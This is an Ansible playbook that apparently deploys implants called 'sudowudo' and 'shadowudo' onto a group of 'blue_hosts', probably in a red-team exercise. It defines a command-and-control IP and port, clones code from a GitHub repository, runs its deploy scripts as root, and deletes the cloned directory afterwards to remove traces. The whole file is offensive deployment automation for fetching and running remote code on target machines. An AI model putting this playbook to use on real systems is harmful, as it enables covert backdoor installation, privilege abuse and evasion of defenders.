---
# Deploy sudowudo/shadowudo on remote hosts
- name: Deploy sudowudo/shadowudo
  hosts: blue_hosts
  remote_user: ubuntu
  var:
    c2_ip: "10.0.1.242"
    c2_port: 4242
  become: yes
  tasks:
    - name: Clone repo
      git:
        repo: https://github.com/vaughnw128/sudowudo.git
        dest: /tmp/sudowudo
        clone: yes
        update: yes

    - name: Install packages
      apt: update_cache=yes name={{ item }} state=present
      with_items:
        - gcc
        - make
        - cmake

    - name: Deploy sudowudo
      command: bash /tmp/sudowudo/deploy-sudowudo

    - name: Deploy shadowudo
      command: bash /tmp/sudowudo/deploy-shadowudo

    - name: Delete content & directory
      ansible.builtin.file:
        state: absent
        path: '/tmp/sudowudo'

